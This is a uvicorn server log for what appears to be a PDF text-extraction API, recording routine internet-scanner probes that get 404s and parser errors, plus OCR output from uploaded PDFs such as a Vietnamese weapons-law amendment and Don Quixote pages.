+httptools.parser.errors.HttpParserInvalidMethodError: Invalid method encountered
+WARNING:  Invalid HTTP request received.
+Traceback (most recent call last):
+  File "/home/ai-r-d/anaconda3/lib/python3.7/site-packages/uvicorn/protocols/http/httptools_impl.py", line 131, in data_received
+    self.parser.feed_data(data)
+  File "httptools/parser/parser.pyx", line 212, in httptools.parser.parser.HttpParser.feed_data
+httptools.parser.errors.HttpParserInvalidMethodError: Invalid method encountered
+INFO:     198.235.24.59:58200 - "GET / HTTP/1.1" 404 Not Found
+WARNING:  Invalid HTTP request received.
+Traceback (most recent call last):
+  File "/home/ai-r-d/anaconda3/lib/python3.7/site-packages/uvicorn/protocols/http/httptools_impl.py", line 131, in data_received
+    self.parser.feed_data(data)
+  File "httptools/parser/parser.pyx", line 212, in httptools.parser.parser.HttpParser.feed_data
+httptools.parser.errors.HttpParserInvalidMethodError: Invalid method encountered
+INFO:     162.142.125.9:45862 - "GET / HTTP/1.1" 404 Not Found
+INFO:     162.142.125.9:33922 - "GET / HTTP/1.1" 404 Not Found
+WARNING:  Invalid HTTP request received.
+Traceback (most recent call last):
+  File "/home/ai-r-d/anaconda3/lib/python3.7/site-packages/uvicorn/protocols/http/httptools_impl.py", line 131, in data_received
+    self.parser.feed_data(data)
+  File "httptools/parser/parser.pyx", line 212, in httptools.parser.parser.HttpParser.feed_data
+httptools.parser.errors.HttpParserError: Pause on PRI/Upgrade
+INFO:     198.235.24.153:64200 - "GET / HTTP/1.1" 404 Not Found
+INFO:     205.210.31.164:57848 - "GET / HTTP/1.1" 404 Not Found
+INFO:     205.210.31.159:56023 - "GET / HTTP/1.0" 404 Not Found
+WARNING:  Invalid HTTP request received.
+Traceback (most recent call last):
+  File "/home/ai-r-d/anaconda3/lib/python3.7/site-packages/uvicorn/protocols/http/httptools_impl.py", line 131, in data_received
+    self.parser.feed_data(data)
+  File "httptools/parser/parser.pyx", line 212, in httptools.parser.parser.HttpParser.feed_data
+httptools.parser.errors.HttpParserInvalidMethodError: Invalid method encountered
+INFO:     91.239.157.50:46874 - "GET /2.php HTTP/1.1" 404 Not Found
+INFO:     91.239.157.50:46878 - "GET /2.php HTTP/1.1" 404 Not Found
+INFO:     91.239.157.50:46886 - "GET /2.php HTTP/1.1" 404 Not Found
+INFO:     87.236.176.166:37597 - "GET / HTTP/1.1" 404 Not Found
+INFO:     123.24.206.26:45661 - "GET / HTTP/1.1" 404 Not Found
+INFO:     205.210.31.132:58746 - "GET / HTTP/1.1" 404 Not Found
+INFO:     198.235.24.49:59584 - "GET / HTTP/1.1" 404 Not Found
+WARNING:  Invalid HTTP request received.
+Traceback (most recent call last):
+  File "/home/ai-r-d/anaconda3/lib/python3.7/site-packages/uvicorn/protocols/http/httptools_impl.py", line 131, in data_received
+    self.parser.feed_data(data)
+  File "httptools/parser/parser.pyx", line 212, in httptools.parser.parser.HttpParser.feed_data
+httptools.parser.errors.HttpParserInvalidMethodError: Invalid method encountered
+INFO:     23.224.186.222:52848 - "GET / HTTP/1.1" 404 Not Found
+INFO:     23.224.186.222:55336 - "GET /favicon.ico HTTP/1.1" 404 Not Found
+INFO:     23.224.186.222:55476 - "GET /robots.txt HTTP/1.1" 404 Not Found
+INFO:     23.224.186.222:55616 - "GET /sitemap.xml HTTP/1.1" 404 Not Found
+WARNING:  Invalid HTTP request received.
+Traceback (most recent call last):
+  File "/home/ai-r-d/anaconda3/lib/python3.7/site-packages/uvicorn/protocols/http/httptools_impl.py", line 131, in data_received
+    self.parser.feed_data(data)
+  File "httptools/parser/parser.pyx", line 212, in httptools.parser.parser.HttpParser.feed_data
+httptools.parser.errors.HttpParserInvalidMethodError: Invalid method encountered
+INFO:     205.210.31.26:60796 - "GET / HTTP/1.1" 404 Not Found
+INFO:     107.174.176.6:54488 - "GET / HTTP/1.1" 404 Not Found
+WARNING:  Invalid HTTP request received.
+Traceback (most recent call last):
+  File "/home/ai-r-d/anaconda3/lib/python3.7/site-packages/uvicorn/protocols/http/httptools_impl.py", line 131, in data_received
+    self.parser.feed_data(data)
+  File "httptools/parser/parser.pyx", line 212, in httptools.parser.parser.HttpParser.feed_data
+httptools.parser.errors.HttpParserInvalidMethodError: Invalid method encountered
+INFO:     205.210.31.137:63362 - "GET / HTTP/1.1" 404 Not Found
+INFO:     198.235.24.41:61396 - "GET / HTTP/1.1" 404 Not Found
+WARNING:  Invalid HTTP request received.
+Traceback (most recent call last):
+  File "/home/ai-r-d/anaconda3/lib/python3.7/site-packages/uvicorn/protocols/http/httptools_impl.py", line 131, in data_received
+    self.parser.feed_data(data)
+  File "httptools/parser/parser.pyx", line 212, in httptools.parser.parser.HttpParser.feed_data
+httptools.parser.errors.HttpParserInvalidMethodError: Invalid method encountered
+WARNING:  Invalid HTTP request received.
+Traceback (most recent call last):
+  File "/home/ai-r-d/anaconda3/lib/python3.7/site-packages/uvicorn/protocols/http/httptools_impl.py", line 131, in data_received
+    self.parser.feed_data(data)
+  File "httptools/parser/parser.pyx", line 212, in httptools.parser.parser.HttpParser.feed_data
+httptools.parser.errors.HttpParserInvalidMethodError: Invalid method encountered
+INFO:     15.236.102.87:56720 - "GET /v1/agent/self HTTP/1.1" 404 Not Found
+INFO:     120.46.185.46:40900 - "GET /v1/agent/self HTTP/1.1" 404 Not Found
+INFO:     198.235.24.44:61460 - "GET / HTTP/1.1" 404 Not Found
+INFO:     106.37.227.19:48228 - "GET /v1/agent/self HTTP/1.1" 404 Not Found
+WARNING:  Invalid HTTP request received.
+Traceback (most recent call last):
+  File "/home/ai-r-d/anaconda3/lib/python3.7/site-packages/uvicorn/protocols/http/httptools_impl.py", line 131, in data_received
+    self.parser.feed_data(data)
+  File "httptools/parser/parser.pyx", line 212, in httptools.parser.parser.HttpParser.feed_data
+httptools.parser.errors.HttpParserInvalidMethodError: Invalid method encountered
+INFO:     43.130.11.228:14826 - "GET / HTTP/1.1" 404 Not Found
+INFO:     205.185.122.184:56568 - "GET / HTTP/1.1" 404 Not Found
+INFO:     209.141.49.169:49480 - "GET / HTTP/1.1" 404 Not Found
+INFO:     209.141.33.65:41374 - "GET / HTTP/1.1" 404 Not Found
+INFO:     209.141.36.231:45060 - "GET / HTTP/1.1" 404 Not Found
+INFO:     209.141.35.128:16048 - "GET / HTTP/1.1" 404 Not Found
+INFO:     209.141.51.222:17938 - "GET / HTTP/1.1" 404 Not Found
+INFO:     209.141.36.231:45378 - "GET / HTTP/1.1" 404 Not Found
+INFO:     209.141.49.169:49804 - "GET / HTTP/1.1" 404 Not Found
+INFO:     209.141.36.112:19926 - "GET / HTTP/1.1" 404 Not Found
+INFO:     209.141.36.231:45578 - "GET / HTTP/1.1" 404 Not Found
+INFO:     209.141.36.231:45594 - "GET / HTTP/1.1" 404 Not Found
+INFO:     205.185.116.25:39348 - "GET / HTTP/1.1" 404 Not Found
+INFO:     205.185.116.25:39500 - "GET / HTTP/1.1" 404 Not Found
+INFO:     209.141.41.193:48964 - "GET / HTTP/1.1" 404 Not Found
+INFO:     209.141.36.231:46008 - "GET / HTTP/1.1" 404 Not Found
+INFO:     209.141.33.65:42434 - "GET / HTTP/1.1" 404 Not Found
+INFO:     205.185.122.184:57538 - "GET / HTTP/1.1" 404 Not Found
+INFO:     205.185.122.184:57454 - "GET / HTTP/1.1" 404 Not Found
+INFO:     205.185.122.184:58016 - "GET / HTTP/1.1" 404 Not Found
+INFO:     205.185.122.184:56568 - "GET /favicon.ico HTTP/1.1" 404 Not Found
+INFO:     209.141.36.231:45378 - "GET /favicon.ico HTTP/1.1" 404 Not Found
+INFO:     209.141.36.231:45060 - "GET /favicon.ico HTTP/1.1" 404 Not Found
+INFO:     209.141.51.222:17938 - "GET /favicon.ico HTTP/1.1" 404 Not Found
+INFO:     209.141.36.112:19926 - "GET /favicon.ico HTTP/1.1" 404 Not Found
+INFO:     209.141.36.231:46008 - "GET /favicon.ico HTTP/1.1" 404 Not Found
+INFO:     209.141.36.231:45578 - "GET /favicon.ico HTTP/1.1" 404 Not Found
+INFO:     209.141.36.231:45594 - "GET /favicon.ico HTTP/1.1" 404 Not Found
+INFO:     209.141.33.65:42434 - "GET /favicon.ico HTTP/1.1" 404 Not Found
+INFO:     209.141.33.65:41374 - "GET /favicon.ico HTTP/1.1" 404 Not Found
+INFO:     205.185.122.184:57454 - "GET /favicon.ico HTTP/1.1" 404 Not Found
+INFO:     209.141.49.169:49480 - "GET /favicon.ico HTTP/1.1" 404 Not Found
+INFO:     205.185.116.25:39500 - "GET /favicon.ico HTTP/1.1" 404 Not Found
+INFO:     205.185.116.25:39348 - "GET /favicon.ico HTTP/1.1" 404 Not Found
+INFO:     205.185.122.184:57538 - "GET /favicon.ico HTTP/1.1" 404 Not Found
+INFO:     209.141.49.169:49804 - "GET /favicon.ico HTTP/1.1" 404 Not Found
+INFO:     205.185.122.184:58016 - "GET /favicon.ico HTTP/1.1" 404 Not Found
+INFO:     209.141.35.128:16048 - "GET /favicon.ico HTTP/1.1" 404 Not Found
+INFO:     209.141.41.193:48964 - "GET /favicon.ico HTTP/1.1" 404 Not Found
+INFO:     205.210.31.48:59810 - "GET / HTTP/1.1" 404 Not Found
+INFO:     205.210.31.40:59698 - "GET / HTTP/1.1" 404 Not Found
+INFO:     35.81.81.19:46804 - "GET / HTTP/1.1" 404 Not Found
+WARNING:  Invalid HTTP request received.
+Traceback (most recent call last):
+  File "/home/ai-r-d/anaconda3/lib/python3.7/site-packages/uvicorn/protocols/http/httptools_impl.py", line 131, in data_received
+    self.parser.feed_data(data)
+  File "httptools/parser/parser.pyx", line 212, in httptools.parser.parser.HttpParser.feed_data
+httptools.parser.errors.HttpParserInvalidMethodError: Invalid method encountered
+INFO:     123.24.206.26:43215 - "GET / HTTP/1.1" 404 Not Found
+WARNING:  Invalid HTTP request received.
+Traceback (most recent call last):
+  File "/home/ai-r-d/anaconda3/lib/python3.7/site-packages/uvicorn/protocols/http/httptools_impl.py", line 131, in data_received
+    self.parser.feed_data(data)
+  File "httptools/parser/parser.pyx", line 212, in httptools.parser.parser.HttpParser.feed_data
+httptools.parser.errors.HttpParserInvalidMethodError: Invalid method encountered
+WARNING:  Invalid HTTP request received.
+Traceback (most recent call last):
+  File "/home/ai-r-d/anaconda3/lib/python3.7/site-packages/uvicorn/protocols/http/httptools_impl.py", line 131, in data_received
+    self.parser.feed_data(data)
+  File "httptools/parser/parser.pyx", line 212, in httptools.parser.parser.HttpParser.feed_data
+httptools.parser.errors.HttpParserInvalidMethodError: Invalid method encountered
+INFO:     178.62.85.164:41660 - "GET / HTTP/1.1" 404 Not Found
+LSD_101.pdf
+Luật số: 50/2019/QH14
+LUẬT
+SỬA ĐỒI, BỔ SUNG MỘT SỐ ĐIỀU CỦA LUẬT QUẢN LÝ,
+SỬ DỤNG VŨ KHÍ, VẬT LIỆU NỔ VÀ CÔNG CỤ HỖ TRỢ
+INFO:     123.24.206.26:43459 - "POST /detect_pdf HTTP/1.1" 200 OK
+LSD_101.pdf
+Luật số: 50/2019/QH14
+LUẬT
+SỬA ĐỒI, BỔ SUNG MỘT SỐ ĐIỀU CỦA LUẬT QUẢN LÝ,
+SỬ DỤNG VŨ KHÍ, VẬT LIỆU NỔ VÀ CÔNG CỤ HỖ TRỢ
+INFO:     123.24.206.26:38829 - "POST /detect_pdf HTTP/1.1" 200 OK
+WARNING:  Invalid HTTP request received.
+Traceback (most recent call last):
+  File "/home/ai-r-d/anaconda3/lib/python3.7/site-packages/uvicorn/protocols/http/httptools_impl.py", line 131, in data_received
+    self.parser.feed_data(data)
+  File "httptools/parser/parser.pyx", line 212, in httptools.parser.parser.HttpParser.feed_data
+httptools.parser.errors.HttpParserInvalidMethodError: Invalid method encountered
+WARNING:  Invalid HTTP request received.
+Traceback (most recent call last):
+  File "/home/ai-r-d/anaconda3/lib/python3.7/site-packages/uvicorn/protocols/http/httptools_impl.py", line 131, in data_received
+    self.parser.feed_data(data)
+  File "httptools/parser/parser.pyx", line 212, in httptools.parser.parser.HttpParser.feed_data
+httptools.parser.errors.HttpParserInvalidMethodError: Invalid method encountered
+WARNING:  Invalid HTTP request received.
+Traceback (most recent call last):
+  File "/home/ai-r-d/anaconda3/lib/python3.7/site-packages/uvicorn/protocols/http/httptools_impl.py", line 131, in data_received
+    self.parser.feed_data(data)
+  File "httptools/parser/parser.pyx", line 212, in httptools.parser.parser.HttpParser.feed_data
+httptools.parser.errors.HttpParserInvalidMethodError: Invalid method encountered
+WARNING:  Invalid HTTP request received.
+Traceback (most recent call last):
+  File "/home/ai-r-d/anaconda3/lib/python3.7/site-packages/uvicorn/protocols/http/httptools_impl.py", line 131, in data_received
+    self.parser.feed_data(data)
+  File "httptools/parser/parser.pyx", line 212, in httptools.parser.parser.HttpParser.feed_data
+httptools.parser.errors.HttpParserInvalidMethodError: Invalid method encountered
+WARNING:  Invalid HTTP request received.
+Traceback (most recent call last):
+  File "/home/ai-r-d/anaconda3/lib/python3.7/site-packages/uvicorn/protocols/http/httptools_impl.py", line 131, in data_received
+    self.parser.feed_data(data)
+  File "httptools/parser/parser.pyx", line 212, in httptools.parser.parser.HttpParser.feed_data
+httptools.parser.errors.HttpParserInvalidMethodError: Invalid method encountered
+INFO:     18.170.58.63:35134 - "GET /favicon.ico HTTP/1.1" 404 Not Found
+INFO:     18.170.58.63:35140 - "GET /manage/account/login HTTP/1.1" 404 Not Found
+INFO:     18.170.58.63:35154 - "GET /admin/index.html HTTP/1.1" 404 Not Found
+INFO:     18.170.58.63:35166 - "GET /index.html HTTP/1.1" 404 Not Found
+INFO:     18.170.58.63:35178 - "GET / HTTP/1.1" 404 Not Found
+INFO:     198.235.24.5:62274 - "GET / HTTP/1.1" 404 Not Found
+INFO:     205.210.31.175:65240 - "GET / HTTP/1.1" 404 Not Found
+WARNING:  Invalid HTTP request received.
+Traceback (most recent call last):
+  File "/home/ai-r-d/anaconda3/lib/python3.7/site-packages/uvicorn/protocols/http/httptools_impl.py", line 131, in data_received
+    self.parser.feed_data(data)
+  File "httptools/parser/parser.pyx", line 212, in httptools.parser.parser.HttpParser.feed_data
+httptools.parser.errors.HttpParserInvalidMethodError: Invalid method encountered
+WARNING:  Invalid HTTP request received.
+Traceback (most recent call last):
+  File "/home/ai-r-d/anaconda3/lib/python3.7/site-packages/uvicorn/protocols/http/httptools_impl.py", line 131, in data_received
+    self.parser.feed_data(data)
+  File "httptools/parser/parser.pyx", line 212, in httptools.parser.parser.HttpParser.feed_data
+httptools.parser.errors.HttpParserInvalidMethodError: Invalid method encountered
+WARNING:  Invalid HTTP request received.
+Traceback (most recent call last):
+  File "/home/ai-r-d/anaconda3/lib/python3.7/site-packages/uvicorn/protocols/http/httptools_impl.py", line 131, in data_received
+    self.parser.feed_data(data)
+  File "httptools/parser/parser.pyx", line 212, in httptools.parser.parser.HttpParser.feed_data
+httptools.parser.errors.HttpParserInvalidMethodError: Invalid method encountered
+WARNING:  Invalid HTTP request received.
+Traceback (most recent call last):
+  File "/home/ai-r-d/anaconda3/lib/python3.7/site-packages/uvicorn/protocols/http/httptools_impl.py", line 131, in data_received
+    self.parser.feed_data(data)
+  File "httptools/parser/parser.pyx", line 212, in httptools.parser.parser.HttpParser.feed_data
+httptools.parser.errors.HttpParserInvalidMethodError: Invalid method encountered
+WARNING:  Invalid HTTP request received.
+Traceback (most recent call last):
+  File "/home/ai-r-d/anaconda3/lib/python3.7/site-packages/uvicorn/protocols/http/httptools_impl.py", line 131, in data_received
+    self.parser.feed_data(data)
+  File "httptools/parser/parser.pyx", line 212, in httptools.parser.parser.HttpParser.feed_data
+httptools.parser.errors.HttpParserInvalidMethodError: Invalid method encountered
+WARNING:  Invalid HTTP request received.
+Traceback (most recent call last):
+  File "/home/ai-r-d/anaconda3/lib/python3.7/site-packages/uvicorn/protocols/http/httptools_impl.py", line 131, in data_received
+    self.parser.feed_data(data)
+  File "httptools/parser/parser.pyx", line 212, in httptools.parser.parser.HttpParser.feed_data
+httptools.parser.errors.HttpParserInvalidMethodError: Invalid method encountered
+WARNING:  Invalid HTTP request received.
+Traceback (most recent call last):
+  File "/home/ai-r-d/anaconda3/lib/python3.7/site-packages/uvicorn/protocols/http/httptools_impl.py", line 131, in data_received
+    self.parser.feed_data(data)
+  File "httptools/parser/parser.pyx", line 212, in httptools.parser.parser.HttpParser.feed_data
+httptools.parser.errors.HttpParserInvalidMethodError: Invalid method encountered
+INFO:     123.24.206.26:51707 - "GET / HTTP/1.1" 404 Not Found
+INFO:     123.24.206.26:47826 - "GET / HTTP/1.1" 404 Not Found
+WARNING:  Invalid HTTP request received.
+Traceback (most recent call last):
+  File "/home/ai-r-d/anaconda3/lib/python3.7/site-packages/uvicorn/protocols/http/httptools_impl.py", line 131, in data_received
+    self.parser.feed_data(data)
+  File "httptools/parser/parser.pyx", line 212, in httptools.parser.parser.HttpParser.feed_data
+httptools.parser.errors.HttpParserInvalidMethodError: Invalid method encountered
+INFO:     87.236.176.128:59381 - "GET / HTTP/1.1" 404 Not Found
+INFO:     162.142.125.213:46066 - "GET / HTTP/1.1" 404 Not Found
+WARNING:  Invalid HTTP request received.
+Traceback (most recent call last):
+  File "/home/ai-r-d/anaconda3/lib/python3.7/site-packages/uvicorn/protocols/http/httptools_impl.py", line 131, in data_received
+    self.parser.feed_data(data)
+  File "httptools/parser/parser.pyx", line 212, in httptools.parser.parser.HttpParser.feed_data
+httptools.parser.errors.HttpParserError: Pause on PRI/Upgrade
+WARNING:  Invalid HTTP request received.
+Traceback (most recent call last):
+  File "/home/ai-r-d/anaconda3/lib/python3.7/site-packages/uvicorn/protocols/http/httptools_impl.py", line 131, in data_received
+    self.parser.feed_data(data)
+  File "httptools/parser/parser.pyx", line 212, in httptools.parser.parser.HttpParser.feed_data
+httptools.parser.errors.HttpParserInvalidMethodError: Invalid method encountered
+WARNING:  Invalid HTTP request received.
+Traceback (most recent call last):
+  File "/home/ai-r-d/anaconda3/lib/python3.7/site-packages/uvicorn/protocols/http/httptools_impl.py", line 131, in data_received
+    self.parser.feed_data(data)
+  File "httptools/parser/parser.pyx", line 212, in httptools.parser.parser.HttpParser.feed_data
+httptools.parser.errors.HttpParserInvalidMethodError: Invalid method encountered
+WARNING:  Invalid HTTP request received.
+Traceback (most recent call last):
+  File "/home/ai-r-d/anaconda3/lib/python3.7/site-packages/uvicorn/protocols/http/httptools_impl.py", line 131, in data_received
+    self.parser.feed_data(data)
+  File "httptools/parser/parser.pyx", line 212, in httptools.parser.parser.HttpParser.feed_data
+httptools.parser.errors.HttpParserInvalidMethodError: Invalid method encountered
+INFO:     35.86.229.59:43346 - "GET / HTTP/1.1" 404 Not Found
+WARNING:  Invalid HTTP request received.
+Traceback (most recent call last):
+  File "/home/ai-r-d/anaconda3/lib/python3.7/site-packages/uvicorn/protocols/http/httptools_impl.py", line 131, in data_received
+    self.parser.feed_data(data)
+  File "httptools/parser/parser.pyx", line 212, in httptools.parser.parser.HttpParser.feed_data
+httptools.parser.errors.HttpParserInvalidMethodError: Invalid method encountered
+INFO:     165.232.176.237:61953 - "GET / HTTP/1.0" 404 Not Found
+WARNING:  Invalid HTTP request received.
+Traceback (most recent call last):
+  File "/home/ai-r-d/anaconda3/lib/python3.7/site-packages/uvicorn/protocols/http/httptools_impl.py", line 131, in data_received
+    self.parser.feed_data(data)
+  File "httptools/parser/parser.pyx", line 212, in httptools.parser.parser.HttpParser.feed_data
+httptools.parser.errors.HttpParserInvalidMethodError: Invalid method encountered
+WARNING:  Invalid HTTP request received.
+Traceback (most recent call last):
+  File "/home/ai-r-d/anaconda3/lib/python3.7/site-packages/uvicorn/protocols/http/httptools_impl.py", line 131, in data_received
+    self.parser.feed_data(data)
+  File "httptools/parser/parser.pyx", line 212, in httptools.parser.parser.HttpParser.feed_data
+httptools.parser.errors.HttpParserInvalidMethodError: Invalid method encountered
+INFO:     178.128.224.237:39738 - "GET / HTTP/1.1" 404 Not Found
+WARNING:  Invalid HTTP request received.
+Traceback (most recent call last):
+  File "/home/ai-r-d/anaconda3/lib/python3.7/site-packages/uvicorn/protocols/http/httptools_impl.py", line 131, in data_received
+    self.parser.feed_data(data)
+  File "httptools/parser/parser.pyx", line 212, in httptools.parser.parser.HttpParser.feed_data
+httptools.parser.errors.HttpParserInvalidMethodError: Invalid method encountered
+INFO:     87.236.176.252:51285 - "GET / HTTP/1.1" 404 Not Found
+INFO:     87.236.176.159:51953 - "GET / HTTP/1.1" 404 Not Found
+WARNING:  Invalid HTTP request received.
+Traceback (most recent call last):
+  File "/home/ai-r-d/anaconda3/lib/python3.7/site-packages/uvicorn/protocols/http/httptools_impl.py", line 131, in data_received
+    self.parser.feed_data(data)
+  File "httptools/parser/parser.pyx", line 212, in httptools.parser.parser.HttpParser.feed_data
+httptools.parser.errors.HttpParserInvalidMethodError: Invalid method encountered
+WARNING:  Invalid HTTP request received.
+Traceback (most recent call last):
+  File "/home/ai-r-d/anaconda3/lib/python3.7/site-packages/uvicorn/protocols/http/httptools_impl.py", line 131, in data_received
+    self.parser.feed_data(data)
+  File "httptools/parser/parser.pyx", line 212, in httptools.parser.parser.HttpParser.feed_data
+httptools.parser.errors.HttpParserInvalidMethodError: Invalid method encountered
+WARNING:  Invalid HTTP request received.
+Traceback (most recent call last):
+  File "/home/ai-r-d/anaconda3/lib/python3.7/site-packages/uvicorn/protocols/http/httptools_impl.py", line 131, in data_received
+    self.parser.feed_data(data)
+  File "httptools/parser/parser.pyx", line 212, in httptools.parser.parser.HttpParser.feed_data
+httptools.parser.errors.HttpParserInvalidMethodError: Invalid method encountered
+INFO:     178.128.51.203:59308 - "GET / HTTP/1.1" 404 Not Found
+công văn đến.pdf
+INFO:     123.24.206.26:44383 - "POST /detect_pdf HTTP/1.1" 200 OK
+công văn đến.pdf
+INFO:     123.24.206.26:45301 - "POST /detect_pdf HTTP/1.1" 200 OK
+INFO:     123.24.206.26:64752 - "OPTIONS /detect_pdf HTTP/1.1" 200 OK
+LSD_101.pdf
+Luật số: 50/2019/QH14
+LUẬT
+SỬA ĐỒI, BỔ SUNG MỘT SỐ ĐIỀU CỦA LUẬT QUẢN LÝ,
+SỬ DỤNG VŨ KHÍ, VẬT LIỆU NỔ VÀ CÔNG CỤ HỖ TRỢ
+Điều 1. Sửa đổi, bổ sung một số điều của Luật Quản lý, sử dụng vũ khí,
+rật liêu nổ và công cu hỗ trợ
+INFO:     123.24.206.26:63468 - "POST /detect_pdf HTTP/1.1" 200 OK
+WARNING:  Invalid HTTP request received.
+Traceback (most recent call last):
+  File "/home/ai-r-d/anaconda3/lib/python3.7/site-packages/uvicorn/protocols/http/httptools_impl.py", line 131, in data_received
+    self.parser.feed_data(data)
+  File "httptools/parser/parser.pyx", line 212, in httptools.parser.parser.HttpParser.feed_data
+httptools.parser.errors.HttpParserInvalidMethodError: Invalid method encountered
+INFO:     123.24.206.26:50599 - "GET /docs HTTP/1.1" 200 OK
+INFO:     123.24.206.26:50599 - "GET /openapi.json HTTP/1.1" 200 OK
+INFO:     123.24.206.26:58876 - "GET / HTTP/1.1" 404 Not Found
+INFO:     123.24.206.26:40501 - "GET /docs HTTP/1.1" 200 OK
+INFO:     123.24.206.26:40501 - "GET /openapi.json HTTP/1.1" 200 OK
+sample.pdf
+038000000099
+MIMMI
+INFO:     123.24.206.26:49149 - "POST /detect_pdf HTTP/1.1" 200 OK
+sample.pdf
+038000000099
+MIMMI
+INFO:     123.24.206.26:61494 - "POST /detect_pdf HTTP/1.1" 200 OK
+INFO:     123.24.206.26:50216 - "GET /manage/account/login HTTP/1.1" 404 Not Found
+INFO:     123.24.206.26:36022 - "GET /admin/index.html HTTP/1.1" 404 Not Found
+INFO:     123.24.206.26:41323 - "GET /index.html HTTP/1.1" 404 Not Found
+INFO:     123.24.206.26:42417 - "GET / HTTP/1.1" 404 Not Found
+WARNING:  Invalid HTTP request received.
+Traceback (most recent call last):
+  File "/home/ai-r-d/anaconda3/lib/python3.7/site-packages/uvicorn/protocols/http/httptools_impl.py", line 131, in data_received
+    self.parser.feed_data(data)
+  File "httptools/parser/parser.pyx", line 212, in httptools.parser.parser.HttpParser.feed_data
+httptools.parser.errors.HttpParserInvalidMethodError: Invalid method encountered
+WARNING:  Invalid HTTP request received.
+Traceback (most recent call last):
+  File "/home/ai-r-d/anaconda3/lib/python3.7/site-packages/uvicorn/protocols/http/httptools_impl.py", line 131, in data_received
+    self.parser.feed_data(data)
+  File "httptools/parser/parser.pyx", line 212, in httptools.parser.parser.HttpParser.feed_data
+httptools.parser.errors.HttpParserInvalidMethodError: Invalid method encountered
+WARNING:  Invalid HTTP request received.
+Traceback (most recent call last):
+  File "/home/ai-r-d/anaconda3/lib/python3.7/site-packages/uvicorn/protocols/http/httptools_impl.py", line 131, in data_received
+    self.parser.feed_data(data)
+  File "httptools/parser/parser.pyx", line 212, in httptools.parser.parser.HttpParser.feed_data
+httptools.parser.errors.HttpParserInvalidMethodError: Invalid method encountered
+WARNING:  Invalid HTTP request received.
+Traceback (most recent call last):
+  File "/home/ai-r-d/anaconda3/lib/python3.7/site-packages/uvicorn/protocols/http/httptools_impl.py", line 131, in data_received
+    self.parser.feed_data(data)
+  File "httptools/parser/parser.pyx", line 212, in httptools.parser.parser.HttpParser.feed_data
+httptools.parser.errors.HttpParserInvalidMethodError: Invalid method encountered
+WARNING:  Invalid HTTP request received.
+Traceback (most recent call last):
+  File "/home/ai-r-d/anaconda3/lib/python3.7/site-packages/uvicorn/protocols/http/httptools_impl.py", line 131, in data_received
+    self.parser.feed_data(data)
+  File "httptools/parser/parser.pyx", line 212, in httptools.parser.parser.HttpParser.feed_data
+httptools.parser.errors.HttpParserInvalidMethodError: Invalid method encountered
+INFO:     35.176.240.53:46910 - "GET /favicon.ico HTTP/1.1" 404 Not Found
+INFO:     35.176.240.53:46924 - "GET /manage/account/login HTTP/1.1" 404 Not Found
+INFO:     35.176.240.53:46930 - "GET /admin/index.html HTTP/1.1" 404 Not Found
+INFO:     35.176.240.53:51204 - "GET /index.html HTTP/1.1" 404 Not Found
+INFO:     35.176.240.53:51208 - "GET / HTTP/1.1" 404 Not Found
+INFO:     8.219.147.55:38220 - "GET / HTTP/1.0" 404 Not Found
+INFO:     8.219.147.55:39096 - "GET / HTTP/1.1" 404 Not Found
+WARNING:  Invalid HTTP request received.
+Traceback (most recent call last):
+  File "/home/ai-r-d/anaconda3/lib/python3.7/site-packages/uvicorn/protocols/http/httptools_impl.py", line 131, in data_received
+    self.parser.feed_data(data)
+  File "httptools/parser/parser.pyx", line 212, in httptools.parser.parser.HttpParser.feed_data
+httptools.parser.errors.HttpParserInvalidMethodError: Invalid method encountered
+WARNING:  Invalid HTTP request received.
+Traceback (most recent call last):
+  File "/home/ai-r-d/anaconda3/lib/python3.7/site-packages/uvicorn/protocols/http/httptools_impl.py", line 131, in data_received
+    self.parser.feed_data(data)
+  File "httptools/parser/parser.pyx", line 212, in httptools.parser.parser.HttpParser.feed_data
+httptools.parser.errors.HttpParserInvalidMethodError: Invalid method encountered
+INFO:     139.59.229.219:47104 - "GET / HTTP/1.1" 404 Not Found
+INFO:     205.210.31.14:62012 - "GET / HTTP/1.1" 404 Not Found
+WARNING:  Invalid HTTP request received.
+Traceback (most recent call last):
+  File "/home/ai-r-d/anaconda3/lib/python3.7/site-packages/uvicorn/protocols/http/httptools_impl.py", line 131, in data_received
+    self.parser.feed_data(data)
+  File "httptools/parser/parser.pyx", line 212, in httptools.parser.parser.HttpParser.feed_data
+httptools.parser.errors.HttpParserInvalidMethodError: Invalid method encountered
+WARNING:  Invalid HTTP request received.
+Traceback (most recent call last):
+  File "/home/ai-r-d/anaconda3/lib/python3.7/site-packages/uvicorn/protocols/http/httptools_impl.py", line 131, in data_received
+    self.parser.feed_data(data)
+  File "httptools/parser/parser.pyx", line 212, in httptools.parser.parser.HttpParser.feed_data
+httptools.parser.errors.HttpParserInvalidMethodError: Invalid method encountered
+INFO:     170.64.145.109:34728 - "GET / HTTP/1.1" 404 Not Found
+INFO:     123.24.206.26:54732 - "GET /docs HTTP/1.1" 200 OK
+INFO:     123.24.206.26:54732 - "GET /openapi.json HTTP/1.1" 200 OK
+INFO:     123.24.206.26:36240 - "OPTIONS /detect_pdf HTTP/1.1" 200 OK
+INFO:     123.24.206.26:57457 - "POST /detect_pdf HTTP/1.1" 422 Unprocessable Entity
+INFO:     123.24.206.26:57074 - "POST /detect_pdf HTTP/1.1" 422 Unprocessable Entity
+INFO:     123.24.206.26:58140 - "POST /detect_pdf HTTP/1.1" 422 Unprocessable Entity
+document.pdf
+uiJote de la Mancha
+Miguel de Cervantes
+INFO:     123.24.206.26:65245 - "POST /detect_pdf HTTP/1.1" 200 OK
+document.pdf
+DUII
+1
+uiJote de la Mancha
+Miquel de Cervantes
+INFO:     123.24.206.26:64568 - "POST /detect_pdf HTTP/1.1" 200 OK
+document.pdf
+Non
+INFO:     123.24.206.26:54157 - "POST /detect_pdf HTTP/1.1" 200 OK
+document.pdf
+LEVIL
+20
+N
+INFO:     123.24.206.26:50053 - "POST /detect_pdf HTTP/1.1" 200 OK
+document.pdf
+Non
+INFO:     123.24.206.26:39055 - "POST /detect_pdf HTTP/1.1" 200 OK
+document.pdf
+INFO:     123.24.206.26:60342 - "POST /detect_pdf HTTP/1.1" 200 OK
+document.pdf
+the gun palum gun palumiu uc dllduluuld 10s uummg
+and sto della concluian sayo de velarte, calza
+2
+to mismo, los dias de entre semana se honner
+una ama que pasaba de los cuarenta, y u
+de campo v plaza, que así ensillaba elrc
+quiJote de la Mancha
+Miguel de Cervantes
+1997 the lusludu yuesalliU ell eslu, que ven
+rar libros de caballerias en que le
+INFO:     123.24.206.26:54655 - "POST /detect_pdf HTTP/1.1" 200 OK
+document.pdf
